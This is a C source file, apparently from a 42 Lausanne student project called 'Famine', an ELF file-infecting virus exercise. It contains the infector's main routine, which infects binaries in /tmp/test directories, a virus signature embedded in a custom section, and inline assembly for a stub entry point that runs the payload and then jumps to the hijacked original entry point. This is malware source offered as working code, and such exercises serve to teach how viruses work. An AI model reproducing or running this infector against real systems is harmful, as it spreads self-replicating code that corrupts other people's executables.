/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: cbopp <cbopp@student.42lausanne.ch>        +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/03/25 13:23:26 by cbopp             #+#    #+#             */
/*   Updated: 2026/05/14 12:04:59 by ilyanar          ###   LAUSANNE.ch       */
/*                                                                            */
/* ************************************************************************** */

#include "../include/famine.h"

#if CREATE_STUB

int main(void) {
	// FIXME: should get the stub from the executable itself,
	//        we will need to add some variables which locate the placeholders
	//        instead of searching through the text
	infect_dir("/tmp/test", stub_bin, stub_bin_len);
	infect_dir("/tmp/test2", stub_bin, stub_bin_len);
	sys_write(STDOUT_FILENO, "done\n", 5);
	return (0);
}

#else

int main(void) {
	infect_dir("/tmp/test", stub_bin, stub_bin_len);
	infect_dir("/tmp/test2", stub_bin, stub_bin_len);
	sys_write(STDOUT_FILENO, "done\n", 5);
	return (0);
}

#endif // CREATE_STUB

// #define NOSTD 1
// #define CREATE_STUB 1
#if CREATE_STUB
#if NOSTD
#else
#error Creating a stub requires NOSTD
#endif
#endif

#if NOSTD

__attribute__((section(".signature")))
__attribute__((used))
char const signature[] = "Famine version 1.0 (c)oded by cbopp-mvan-wij";

__attribute__((used))
size_t my_start(size_t *rsp) {
	size_t argc = rsp[0];
	char **argv = (char**)&rsp[1];
	char **envp = &argv[argc + 1];
	size_t envp_len = 0;
	while (envp[envp_len] != NULL) {
		envp_len++;
	}
	size_t *auxv = (size_t*)&envp[envp_len + 1];

	main();
	// my_main(argc, argv, envp, auxv);
	// sys_exit(my_main(argc, argv, envp, auxv));
	// __builtin_unreachable();

	size_t load_base = 0;
	for (size_t i = 0; auxv[i] != AT_NULL; i += 2) {
		if (auxv[i] == AT_PHDR) {
			load_base = auxv[i + 1];
			break;
		}
	}
	// sys_exit(0);
	return load_base;
}

#if CREATE_STUB

__attribute__((section("._start")))
__attribute__((naked))
void _start() {
	// callee-saved RBX, RSP, RBP, and R12–R15
	asm volatile(
		"movq %%rdx, %%rbx\n" // save rtld_fini
		"leaq (%%rsp), %%rdi\n" // pass address of rsp to my_start
		"call my_start\n"
		"movq %%rax, %%rbp\n" // rbp = load_base
		"movq %%rbx, %%rdx\n" // restore rtld_fini
		"movq $0xAAAAAAAAAAAAAAAA, %%r11\n" // placeholder for e_entry
		"add %%rbp, %%r11\n" // + load_base = actual runtime entry
		"jmpq *%%r11\n"
		:
	);
}

#else

__attribute__((section("._start")))
__attribute__((naked))
void _start() {
	// callee-saved RBX, RSP, RBP, and R12–R15
	asm volatile(
		"movq %%rdx, %%rbx\n" // save rtld_fini
		"leaq (%%rsp), %%rdi\n" // pass address of rsp to my_start
		"call my_start\n"
		"xorq %%rdi, %%rdi\n"
		"movq $60, %%rax\n"
		"syscall\n"
		:
	);
}

#endif // CREATE_STUB
#endif // NOSTD
